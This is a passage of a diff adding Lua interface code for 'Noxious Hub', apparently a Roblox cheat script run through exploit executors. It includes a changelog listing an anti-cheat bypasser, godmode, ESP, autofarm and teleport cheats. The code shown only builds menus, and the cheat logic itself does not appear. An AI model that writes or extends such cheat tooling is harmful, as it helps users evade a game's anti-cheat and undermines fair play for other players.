+				noxious["favorited command states"][commandText] = not noxious["favorited command states"][commandText]
+				imageButton.Image = noxious["favorited command states"][commandText] and "rbxassetid://84270520426892" or "rbxassetid://110183128911099"
+
+				if noxious["favorited command states"][commandText] then
+					if not table.find(noxious["command lists"]["Favorited Commands"], commandText) then
+						table.insert(noxious["command lists"]["Favorited Commands"], commandText)
+					end
+				else
+					local index = table.find(noxious["command lists"]["Favorited Commands"], commandText)
+					if index then
+						table.remove(noxious["command lists"]["Favorited Commands"], index)
+					end
+				end
+
+				task.spawn(savefavoritedcommandstates)
+				task.spawn(savefavoritedcommands)
+				task.spawn(initializeAllCommands)
+			end)
+
+			commandtext.MouseButton1Click:Connect(function()
+				playclicksound()
+
+				local commandText = commandtext.Text
+				local commandName
+
+				commandName = commandText:match("^(.-),")
+
+				if not commandName then
+					commandName = commandText:match("^(.-)%s*%[")
+				end
+
+				if not commandName then
+					commandName = commandText:match("^(.-)%s*%-")
+				end
+
+				commandName = commandName or commandText
+
+				commandName = commandName:gsub("%(P%) ", ""):gsub("%s+$", "")
+				commandName = commandName:gsub("%(HP%) ", ""):gsub("%s+$", "")
+				commandName = commandName:gsub("%(KEY%) ", ""):gsub("%s+$", "")
+
+				noxious["command bar"].Text = commandName
+			end)
+
+			infobutton.MouseEnter:Connect(function()
+				if not noxious["tooltip hover debounce"] and commandText and commandText:match("^%s*$") == nil then
+					noxious["tooltip hover debounce"] = true
+					noxious["current hovering command"] = commandtext
+
+					local namePart, descriptionPart = commandText:match("^(.-)%s*%-%s*(.*)$")
+					namePart = namePart or commandText
+					descriptionPart = descriptionPart or ""
+
+					updatetooltipSize(namePart, descriptionPart)
+
+					noxious["tooltip main frame"].Position = infobutton.Position + UDim2.new(0, 254, 0, 76)
+					noxious["tooltip main frame"].Visible = true
+
+					task.delay(0.05, function()
+						noxious["tooltip hover debounce"] = false
+					end)
+				end
+			end)
+
+			infobutton.MouseLeave:Connect(function()
+				if noxious["current hovering command"] == commandtext then
+					noxious["tooltip main frame"].Visible = false
+					noxious["current hovering command"] = nil
+				end
+			end)
+		end
+	end
+
+	commandscrollframe.CanvasSize = UDim2.new(0, 0, 0.017, totalHeight+ 11)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["command button holder"] = Instance.new("ScrollingFrame")
+noxious["command button holder"].Size = UDim2.new(0, 260.7, 0, 204)
+noxious["command button holder"].Position = UDim2.new(0, 0, 0, 50)
+noxious["command button holder"].ScrollBarThickness = 12
+noxious["command button holder"].BackgroundTransparency = 1
+noxious["command button holder"].BorderSizePixel = 1
+noxious["command button holder"].BorderColor3 = noxious["default white color"]
+noxious["command button holder"].Parent = mainframe
+noxious["command button holder"].ScrollingDirection = Enum.ScrollingDirection.Y
+noxious["command button holder"].ScrollBarImageColor3 = noxious["default white color"]
+noxious["command button holder"].ScrollBarImageTransparency = 0
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["scroll bar holder"] = Instance.new("Frame")
+noxious["scroll bar holder"].Size = UDim2.new(0, 12.100000000000001, 0, 242.00000000000003)
+noxious["scroll bar holder"].BackgroundColor3 = noxious["default black color"]
+noxious["scroll bar holder"].BorderSizePixel = 0
+noxious["scroll bar holder"].Position = UDim2.new(0, 248, 0, 48)
+noxious["scroll bar holder"].BorderColor3 = noxious["default white color"]
+noxious["scroll bar holder"].BorderSizePixel = 1
+noxious["scroll bar holder"].ZIndex = 0
+noxious["scroll bar holder"].Parent = mainframe
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+task.wait(0.1)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+-- triple check...
+if not noxious["in studio"] then
+	loadnoxioussettings()
+	initializenoxioussettings()
+	syncespcolors()
+	print("[Noxious Hub]: File config load attempt #3")
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local sectionData = {
+	{type = "separator", text = " ┌  Commands  ─────────────────────────"},
+	{type = "button", text = "All Commands"},
+	{type = "button", text = "Main"},
+	{type = "button", text = "Donor Commands"},
+	{type = "button", text = "Favorited Commands"},
+	{type = "button", text = "ESPs / Visuals"},
+	{type = "button", text = "Client Sided Skins"},
+	{type = "button", text = "Map / Environment"},
+	{type = "button", text = "Teleports / Locating"},
+	{type = "button", text = "Local Player"},
+	{type = "button", text = "Fun / Trolls"},
+	{type = "button", text = "Automation"},
+	{type = "button", text = "Animations / Emotes"},
+	{type = "button", text = "Scripts"},
+	{type = "separator", text = " ├  Buttons  ──────────────────────────"},
+	{type = "button", text = "Autofarm"},
+	{type = "button", text = "Animations"},
+	{type = "button", text = "Toon Customization"},
+	{type = "separator", text = " ├  File  ─────────────────────────────"},
+	{type = "button", text = "Configuration"},
+	{type = "button", text = "Settings"},
+	{type = "separator", text = " └─────────────────────────────────────"},
+}
+
+function updateButtonText(clickedButton)
+	for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+		if button:IsA("TextButton") then
+			if clickedButton and button == clickedButton then
+				if not button.Text:find("> ") then
+					button.Text = "> " .. button.Text .. " <"
+				end
+			else
+				button.Text = button.Text:gsub("> ", ""):gsub(" <", "")
+			end
+		end
+	end
+end
+
+noxious["buttons section button height"] = 45
+noxious["buttons section seperator height"] = 20
+noxious["buttons section vertical spacing"] = 10
+noxious["buttons section starting y pos"] = 9
+
+noxious["command button holder"]:ClearAllChildren()
+
+for _, element in ipairs(sectionData) do
+	if element.type == "separator" then
+		local separator = Instance.new("TextLabel")
+		separator.Name = "Separator_"..element.text
+		separator.Size = UDim2.new(0, 219, 0, noxious["buttons section seperator height"])
+		separator.Position = UDim2.new(0, 8, 0, noxious["buttons section starting y pos"])
+		separator.BackgroundTransparency = 1
+		separator.TextColor3 = noxious["default white color"]
+		separator.Text = element.text
+		separator.TextXAlignment = Enum.TextXAlignment.Left
+		separator.Font = Enum.Font.Nunito
+		separator.TextSize = 19.2
+		separator.ZIndex = 18
+		separator.ClipsDescendants = true
+		separator.Parent = noxious["command button holder"]
+
+		local seppadding = Instance.new("UIPadding")
+		seppadding.PaddingTop = UDim.new(0, 1)
+		seppadding.Parent = separator
+
+		noxious["buttons section starting y pos"] = noxious["buttons section starting y pos"] + noxious["buttons section seperator height"] + noxious["buttons section vertical spacing"]
+	elseif element.type == "button" then
+		local button = Instance.new("TextButton")
+		button.Name = "Btn_"..element.text
+		button.Size = UDim2.new(0, 231, 0, noxious["buttons section button height"])
+		button.Position = UDim2.new(0, 8, 0, noxious["buttons section starting y pos"])
+		button.BackgroundColor3 = Color3.new(0, 0, 0)
+		button.TextColor3 = noxious["default white color"]
+		button.Text = element.text
+		button.BorderSizePixel = 1
+		button.BorderColor3 = noxious["default white color"]
+		button.ZIndex = 18
+		button.Font = Enum.Font.Nunito
+		button.TextSize = 19.2
+		button.TextXAlignment = Enum.TextXAlignment.Center
+		button.Parent = noxious["command button holder"]
+		button.AutoButtonColor = true
+
+		local uicorner = Instance.new("UICorner")
+		uicorner.CornerRadius = UDim.new(0.2, 0)
+		uicorner.Parent = button
+
+		local border = Instance.new("Frame")
+		border.Size = UDim2.new(0, 233, 0, noxious["buttons section button height"] + 2)
+		border.BackgroundColor3 = noxious["default white color"]
+		border.Position = UDim2.new(0, -1, 0, -1)
+		border.ZIndex = 17
+		border.Parent = button
+
+		local bordercorner = Instance.new("UICorner")
+		bordercorner.CornerRadius = UDim.new(0.2, 0)
+		bordercorner.Parent = border
+
+		button.MouseButton1Click:Connect(function()
+			playclicksound()
+			task.spawn(function()
+				if noxious["button lists"] and noxious["button lists"][element.text] then
+					noxious["current list"] = element.text
+					dispbuttons(noxious["button lists"][element.text])
+				else
+					local commandList = noxious["command lists"][element.text]
+					if commandList then
+						for _, child in ipairs(mainframe:GetChildren()) do
+							if child:IsA("TextLabel") and child.Name == "Introduction" then
+								child:Destroy()
+							elseif child:IsA("ScrollingFrame") and child.Name == "CommandScrollFrame" then
+								child:Destroy()
+							elseif child:IsA("Frame") and child.Name == "CommandContainer" then
+								child:Destroy()
+							end
+						end
+						dispcmds(commandList)
+					end
+				end
+
+				-- <<<<< HERE: update previousListName to current clicked button list >>>>>
+				previousListName = element.text
+				noxious["current displayed list"] = element.text
+
+				updateButtonText(button)
+			end)
+		end)
+
+		noxious["buttons section starting y pos"] = noxious["buttons section starting y pos"] + noxious["buttons section button height"] + noxious["buttons section vertical spacing"]
+	end
+end
+
+noxious["command button holder"].CanvasSize = UDim2.new(0, 0, 0, noxious["buttons section starting y pos"] - 2)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["tabs frame"] = Instance.new("Frame")
+noxious["tabs frame"].Size = UDim2.new(0, 594, 0, 26.4)
+noxious["tabs frame"].Position = UDim2.new(0, 0, 0, 53)
+noxious["tabs frame"].BackgroundColor3 = noxious["default black color"]
+noxious["tabs frame"].BorderColor3 = noxious["default white color"]
+noxious["tabs frame"].BorderSizePixel = 1
+noxious["tabs frame"].Parent = noxious["top frame"]
+
+tabCount = 4
+tabWidth = 0.25
+totalRelativeWidth = tabCount * tabWidth
+startPosition = (1 - totalRelativeWidth) / 2
+
+noxious["functions tab"] = Instance.new("TextButton")
+noxious["functions tab"].Size = UDim2.new(tabWidth, 0, 0, 26.4)
+noxious["functions tab"].Position = UDim2.new(startPosition, 0, 0, 0)
+noxious["functions tab"].BackgroundColor3 = noxious["default black color"]
+noxious["functions tab"].BorderColor3 = noxious["default white color"]
+noxious["functions tab"].BorderSizePixel = 1
+noxious["functions tab"].Parent = noxious["tabs frame"]
+noxious["functions tab"].TextColor3 = noxious["default white color"]
+noxious["functions tab"].Font = Enum.Font.Nunito
+noxious["functions tab"].TextSize = 20
+noxious["functions tab"].TextScaled = false
+noxious["functions tab"].Text = "> Functions <"
+noxious["functions tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["functions tab"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["information tab"] = Instance.new("TextButton")
+noxious["information tab"].Size = UDim2.new(tabWidth, 0, 0, 26.4)
+noxious["information tab"].Position = UDim2.new(startPosition + tabWidth, 0, 0, 0)
+noxious["information tab"].BackgroundColor3 = noxious["default black color"]
+noxious["information tab"].BorderColor3 = noxious["default white color"]
+noxious["information tab"].BorderSizePixel = 1
+noxious["information tab"].Parent = noxious["tabs frame"]
+noxious["information tab"].TextColor3 = noxious["default white color"]
+noxious["information tab"].Font = Enum.Font.Nunito
+noxious["information tab"].TextSize = 20
+noxious["information tab"].TextScaled = false
+noxious["information tab"].Text = "Info"
+noxious["information tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["information tab"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["changelogs tab"] = Instance.new("TextButton")
+noxious["changelogs tab"].Size = UDim2.new(tabWidth, 0, 0, 26.4)
+noxious["changelogs tab"].Position = UDim2.new(startPosition + tabWidth * 2, 0, 0, 0)
+noxious["changelogs tab"].BackgroundColor3 = noxious["default black color"]
+noxious["changelogs tab"].BorderColor3 = noxious["default white color"]
+noxious["changelogs tab"].BorderSizePixel = 1
+noxious["changelogs tab"].Parent = noxious["tabs frame"]
+noxious["changelogs tab"].TextColor3 = noxious["default white color"]
+noxious["changelogs tab"].Font = Enum.Font.Nunito
+noxious["changelogs tab"].TextSize = 20
+noxious["changelogs tab"].TextScaled = false
+noxious["changelogs tab"].Text = "Changes"
+noxious["changelogs tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["changelogs tab"].TextYAlignment = Enum.TextYAlignment.Center
+
+
+noxious["credits tab"] = Instance.new("TextButton")
+noxious["credits tab"].Size = UDim2.new(tabWidth, 0, 0, 26.4)
+noxious["credits tab"].Position = UDim2.new(startPosition + tabWidth * 3, 0, 0, 0)
+noxious["credits tab"].BackgroundColor3 = noxious["default black color"]
+noxious["credits tab"].BorderColor3 = noxious["default white color"]
+noxious["credits tab"].BorderSizePixel = 1
+noxious["credits tab"].Parent = noxious["tabs frame"]
+noxious["credits tab"].TextColor3 = noxious["default white color"]
+noxious["credits tab"].Font = Enum.Font.Nunito
+noxious["credits tab"].TextSize = 20
+noxious["credits tab"].TextScaled = false
+noxious["credits tab"].Text = "Credits"
+noxious["credits tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["credits tab"].TextYAlignment = Enum.TextYAlignment.Center
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["settings tab"] = Instance.new("TextButton")
+noxious["settings tab"].Size = UDim2.new(0.5, 0, 0, 26.4)
+noxious["settings tab"].Position = UDim2.new(startPosition, 0, 0, 0)
+noxious["settings tab"].BackgroundColor3 = noxious["default black color"]
+noxious["settings tab"].BorderColor3 = noxious["default white color"]
+noxious["settings tab"].BorderSizePixel = 1
+noxious["settings tab"].Parent = noxious["tabs frame"]
+noxious["settings tab"].TextColor3 = noxious["default white color"]
+noxious["settings tab"].Font = Enum.Font.Nunito
+noxious["settings tab"].TextSize = 20
+noxious["settings tab"].TextScaled = false
+noxious["settings tab"].Text = "> Settings <"
+noxious["settings tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["settings tab"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["settings tab"].Visible = false
+
+noxious["configurations tab"] = Instance.new("TextButton")
+noxious["configurations tab"].Size = UDim2.new(0.5, 0, 0, 26.4)
+noxious["configurations tab"].Position = UDim2.new(startPosition + 0.5, 0, 0, 0)
+noxious["configurations tab"].BackgroundColor3 = noxious["default black color"]
+noxious["configurations tab"].BorderColor3 = noxious["default white color"]
+noxious["configurations tab"].BorderSizePixel = 1
+noxious["configurations tab"].Parent = noxious["tabs frame"]
+noxious["configurations tab"].TextColor3 = noxious["default white color"]
+noxious["configurations tab"].Font = Enum.Font.Nunito
+noxious["configurations tab"].TextSize = 20
+noxious["configurations tab"].TextScaled = false
+noxious["configurations tab"].Text = "Configurations"
+noxious["configurations tab"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["configurations tab"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["configurations tab"].Visible = false
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["back to functions button"] = Instance.new("TextButton")
+noxious["back to functions button"].Visible = false
+noxious["back to functions button"].Size = UDim2.new(0, 156.3, 0, 36.3)
+noxious["back to functions button"].Position = UDim2.new(0.013, 0, 0.1579, 0)
+noxious["back to functions button"].BackgroundColor3 = noxious["default black color"]
+noxious["back to functions button"].BorderColor3 = noxious["default white color"]
+noxious["back to functions button"].BorderSizePixel = 1
+noxious["back to functions button"].Parent = noxious["bottom frame"]
+noxious["back to functions button"].TextColor3 = noxious["default white color"]
+noxious["back to functions button"].Font = Enum.Font.Nunito
+noxious["back to functions button"].TextSize = 20
+noxious["back to functions button"].TextScaled = false
+noxious["back to functions button"].Text = "Back to Functions"
+noxious["back to functions button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["back to functions button"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["back to functions button ui corner"] = Instance.new("UICorner")
+noxious["back to functions button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["back to functions button ui corner"].Parent = noxious["back to functions button"]
+
+noxious["back to functions button border"] = Instance.new("Frame")
+noxious["back to functions button border"].Size = UDim2.new(0, 158.3, 0, 38.3)
+noxious["back to functions button border"].BackgroundColor3 = noxious["default white color"]
+noxious["back to functions button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["back to functions button border"].Parent = noxious["back to functions button"]
+noxious["back to functions button border"].ZIndex = 18
+
+noxious["back to functions button border ui corner"] = Instance.new("UICorner")
+noxious["back to functions button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["back to functions button border ui corner"].Parent = noxious["back to functions button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["back button"] = Instance.new("TextButton")
+noxious["back button"].Visible = false
+noxious["back button"].Size = UDim2.new(0, 156.3, 0, 36.3)
+noxious["back button"].Position = UDim2.new(0.013, 0, 0.1579, 0)
+noxious["back button"].BackgroundColor3 = noxious["default black color"]
+noxious["back button"].BorderColor3 = noxious["default white color"]
+noxious["back button"].BorderSizePixel = 1
+noxious["back button"].Parent = noxious["bottom frame"]
+noxious["back button"].TextColor3 = noxious["default white color"]
+noxious["back button"].Font = Enum.Font.Nunito
+noxious["back button"].TextSize = 20
+noxious["back button"].TextScaled = false
+noxious["back button"].Text = "Back"
+noxious["back button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["back button"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["back button ui corner"] = Instance.new("UICorner")
+noxious["back button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["back button ui corner"].Parent = noxious["back button"]
+
+noxious["back button border"] = Instance.new("Frame")
+noxious["back button border"].Size = UDim2.new(0, 158.3, 0, 38.3)
+noxious["back button border"].BackgroundColor3 = noxious["default white color"]
+noxious["back button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["back button border"].Parent = noxious["back button"]
+noxious["back button border"].ZIndex = 18
+
+noxious["back button border ui corner"] = Instance.new("UICorner")
+noxious["back button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["back button border ui corner"].Parent = noxious["back button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["reload noxious button"] = Instance.new("TextButton")
+noxious["reload noxious button"].Visible = false
+noxious["reload noxious button"].Size = UDim2.new(0, 136.3, 0, 36.3)
+noxious["reload noxious button"].Position = UDim2.new(0.292, 0, 0.1579, 0)
+noxious["reload noxious button"].BackgroundColor3 = noxious["default black color"]
+noxious["reload noxious button"].BorderColor3 = noxious["default white color"]
+noxious["reload noxious button"].BorderSizePixel = 1
+noxious["reload noxious button"].Parent = noxious["bottom frame"]
+noxious["reload noxious button"].TextColor3 = noxious["default white color"]
+noxious["reload noxious button"].Font = Enum.Font.Nunito
+noxious["reload noxious button"].TextSize = 20
+noxious["reload noxious button"].TextScaled = false
+noxious["reload noxious button"].Text = "Reload Noxious"
+noxious["reload noxious button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["reload noxious button"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["reload noxious button ui corner"] = Instance.new("UICorner")
+noxious["reload noxious button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["reload noxious button ui corner"].Parent = noxious["reload noxious button"]
+
+noxious["reload noxious button border"] = Instance.new("Frame")
+noxious["reload noxious button border"].Size = UDim2.new(0, 138.3, 0, 38.3)
+noxious["reload noxious button border"].BackgroundColor3 = noxious["default white color"]
+noxious["reload noxious button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["reload noxious button border"].Parent = noxious["reload noxious button"]
+noxious["reload noxious button border"].ZIndex = 18
+
+noxious["reload noxious button border ui corner"] = Instance.new("UICorner")
+noxious["reload noxious button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["reload noxious button border ui corner"].Parent = noxious["reload noxious button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["workspace.info button"] = Instance.new("TextButton")
+noxious["workspace.info button"].Visible = false
+noxious["workspace.info button"].Size = UDim2.new(0, 156.3, 0, 36.3)
+noxious["workspace.info button"].Position = UDim2.new(0.013, 0, 0.1579, 0)
+noxious["workspace.info button"].BackgroundColor3 = noxious["default black color"]
+noxious["workspace.info button"].BorderColor3 = noxious["default white color"]
+noxious["workspace.info button"].BorderSizePixel = 1
+noxious["workspace.info button"].Parent = noxious["bottom frame"]
+noxious["workspace.info button"].TextColor3 = noxious["default white color"]
+noxious["workspace.info button"].Font = Enum.Font.Nunito
+noxious["workspace.info button"].TextSize = 20
+noxious["workspace.info button"].TextScaled = false
+noxious["workspace.info button"].Text = "Workspace.Info"
+noxious["workspace.info button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["workspace.info button"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["workspace.info button ui corner"] = Instance.new("UICorner")
+noxious["workspace.info button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["workspace.info button ui corner"].Parent = noxious["workspace.info button"]
+
+noxious["workspace.info button border"] = Instance.new("Frame")
+noxious["workspace.info button border"].Size = UDim2.new(0, 158.3, 0, 38.3)
+noxious["workspace.info button border"].BackgroundColor3 = noxious["default white color"]
+noxious["workspace.info button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["workspace.info button border"].Parent = noxious["workspace.info button"]
+noxious["workspace.info button border"].ZIndex = 18
+
+noxious["workspace.info button border ui corner"] = Instance.new("UICorner")
+noxious["workspace.info button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["workspace.info button border ui corner"].Parent = noxious["workspace.info button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["noxious info button"] = Instance.new("TextButton")
+noxious["noxious info button"].Visible = false
+noxious["noxious info button"].Size = UDim2.new(0, 136.3, 0, 36.3)
+noxious["noxious info button"].Position = UDim2.new(0.292, 0, 0.1579, 0)
+noxious["noxious info button"].BackgroundColor3 = noxious["default black color"]
+noxious["noxious info button"].BorderColor3 = noxious["default white color"]
+noxious["noxious info button"].BorderSizePixel = 1
+noxious["noxious info button"].Parent = noxious["bottom frame"]
+noxious["noxious info button"].TextColor3 = noxious["default white color"]
+noxious["noxious info button"].Font = Enum.Font.Nunito
+noxious["noxious info button"].TextSize = 20
+noxious["noxious info button"].TextScaled = false
+noxious["noxious info button"].Text = "> Noxious Info <"
+noxious["noxious info button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["noxious info button"].TextYAlignment = Enum.TextYAlignment.Center
+
+noxious["noxious info button ui corner"] = Instance.new("UICorner")
+noxious["noxious info button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["noxious info button ui corner"].Parent = noxious["noxious info button"]
+
+noxious["noxious info button border"] = Instance.new("Frame")
+noxious["noxious info button border"].Size = UDim2.new(0, 138.3, 0, 38.3)
+noxious["noxious info button border"].BackgroundColor3 = noxious["default white color"]
+noxious["noxious info button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["noxious info button border"].Parent = noxious["noxious info button"]
+noxious["noxious info button border"].ZIndex = 18
+
+noxious["noxious info button border ui corner"] = Instance.new("UICorner")
+noxious["noxious info button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["noxious info button border ui corner"].Parent = noxious["noxious info button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["total commands"] = 0
+
+for listName, commandList in pairs(noxious["command lists"]) do
+	if listName ~= "All Commands" then
+		for _, commandString in ipairs(commandList) do
+			if string.find(commandString, " %- ") then
+				noxious["total commands"] += 1
+			end
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["changelogs"] = {
+	{type = "line", text = "┌  Current version (Version " .. noxious["version"] .. ")", paddingRight = 12},
+	{type = "paragraph",
+		text = [[
+UI changes:
+- Adjusted the look of the interface.
+- Added categories.
+- Added 2 new categories. (Buttons, File)
+- Renamed the 'Commands' tab to 'Functions'.
+- Removed the 'Patched Commands' commands section.
+- Renamed the 'Teleports' command section with 'Teleports / Locating'.
+
+Command updates:
+- Added 2 'Main' commands. (rerun, commandbar)
+- Added 19 'Local Player' commands. (pulsespeed, unpulsespeed, disableinfinitestamina, enable / disable extractingtpwalk [speed], enable / disable dodgetwisteds, exitdeath, rejoindeath, rerundeath, un / loopspeed [speed], enable / disable buyaura, enable / disable antitendrils, un / stretchcamera [x, y])
+- Added 3 'Client Sided Skins' commands. (changeskin, clonestack [number], unclonestack)
+- Added 4 'Automation' commands. (enable / disable autosprint, enable / disable autoshellyboost)
+- Added 6 'Donor Commands' commands. (scriptolviajumpscare, scriptps4glitchjumpscare, scriptlucyjumpscare, noxioususercheck, scriptpatrickbatemanscreamingjumpscare, scriptkendricklamarjumpscare)
+- Added 10 'Fun / Trolls' commands. (floatlay, unfloatlay, upsidedown, rightsideup, rotate [x, y, z], convulse, unconvulse, xspin [speed], zspin [speed], reversemessages)
+- Added 4 'Teleports / Locating' commands. (teleporttofakeelevator, pathfindtogenerator, pathfindtoelevator, predictserverposition)
+- Attempted to make the script cause less performance issues.
+- Removed patched commands.
+- Replaced the 'enablegodmode2' command with 'enableavoidtwisteds'.
+- Replaced the 'disablegodmode3' command with 'disableavoidtwisteds'.
+- Removed the 'animationsgui' and the 'autofarmgui' commands.
+- Removed the 'scarletautofarm' command. Use the one in her hub.
+- Attempted to fix the 'riddance' command not working at all.
+- Renamed the 'infinitestamina' command to 'enableinfinitestamina'.
+- Renamed the 'getresearch' command to 'encountertwisteds'.
+- Made the 'fly' command easier to control.
+- Made it so the 'enablegeneratoraura' command doesnt force you back into the machine when a twisted spots you or when you want to stop extracting.
+- Made it so the 'teleporttogenerator' command excludes generators that are being worked on.
+- Updated the 'enableautoteleporttogenerator' command.
+- Made it so the 'enableautovotebestcard' command votes for the heal card if any Toons have a health lower than 3.
+- Made it so the 'enableinfinitestamina' command works with Looey's passive ability.
+
+Other:
+- Attempted to fix Donor commands not working at all.
+- Rewrote and optimized the script's code.
+- Updated teleportation method.
+- Removed the animations GUI and the autofarm GUI.
+- Corrected spelling errors.
+- Fixed script crashing when executing on Krnl.
+- Fixed Toon checks. (idk how we keep accidentally removing it)
+- Added generator statuses for the generator ESP.
+- Changed 'Heals' to 'Rare Items' and 'Extraction Items' to 'Super Rare Items' for the ESP, and changed their targets.
+- Updated the timer functionality for the ESP for Twisteds that have a grabbing ability. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.6 (Fully released on June 11th 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
+- Updated the 'enablegodmode3' command.
+- Attempted to fix both 'enableitemaura2' and 'enablegeneratoraura' commands causing performance issues.
+- Attempted to make the 'getresearch' command more reliable.
+
+Other:
+- Updated teleportation method. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.5 (Fully released on June 9th 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
+- Added 1 'Local Player' command. (infinitestamina) 
+- Added 2 'Automation' commands. (enable / disable autovotebestcard)
+- Attempted to fix the 'enablegodmode3' command bugging out on some occasions.
+- Attempted to fix the 'enableautoteleporttogenerator' command only working once.
+- Attempted to fix the 'enablerareitemspickedupnotifier' command only working once.
+
+Other:
+- Made it so there is an ability cooldown timer for the Twisted craft siblings.
+- Made it so teleporting to a generator excludes generators that are being worked on. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.4 (Fully released on June 6th 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
+- Added 2 'Local Player' commands. (disablegodmode, disablegodmode2)
+- Added 1 'Automation' command. (disableautocalibration2)
+- Added Twisted Toodles' old animations for the 'animationpack' command.
+- Attempted to fix the 'enablegodmode3' command bugging out on some occasions.
+- Attempted to fix both 'enablegeneratoraura' and 'enableitemaura2' commands causing problems with your server position.
+- Made it so the 'enablegeneratoraura' command does not work on posessed machines.
+
+Other:
+- Attempted to optimize the ESP. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.3 (Fully released on June 3rd 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
+- Added an argument for the 'enablespameggsonabilityaudio' command. (speed)
+- Fixed commands from update 7.8.2 disappearing.
+
+Other:
+- Updated the Animations GUI. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.2 (Fully released on June 1st 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
+- Added 12 'Automation' commands. (enable / disable panicautopickupallitems, enable / disable panicautopickupallresearchcapsules, enable / disable panicautopickupalltapes, enable / disable, panicautopickupallheals, enable / disable panicautopickupallresearchcapsules, enable / disable panicautogetresearch)
+- Added 2 'Fun / Trolls' commands. (enable / disable spameggsonabilityaudio)
+- Attempted to fix the 'facelessshrimpo' command making your face untextured.
+- Fixed commands from update 7.8.1 disappearing. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.1 (Fully released on May 31st 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+UI changes:
+- Added 1 command button. (Automation)
+- Attempted to fix commands and lists not fully loading.
+
+Command updates:
+- Added 3 'Local Player' commands. (disableanticheatbypasser)
+- Added 2 'Map / Environment' commands. (pointlight [target] [range] [color], unpointlight [target])
+- Added 12 'Automation' commands. (enable / disable autopickupallitems, enable / disable autopickupallresearchcapsules, enable / disable autopickupalltapes, enable / disable autopickupallheals, enable / disable autopickupallextractionitems, enable / disable autogetresearch)
+- Added 1 'Client Sided Skins' command. (whatsappastro)
+- Replaced the 'bypassanticheat' command with 'enableanticheatbypasser'. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.8.0 (Fully released on May 25th 2025)", paddingRight = 12},
+
+	{type = "paragraph",
+		text = [[
+Command updates:
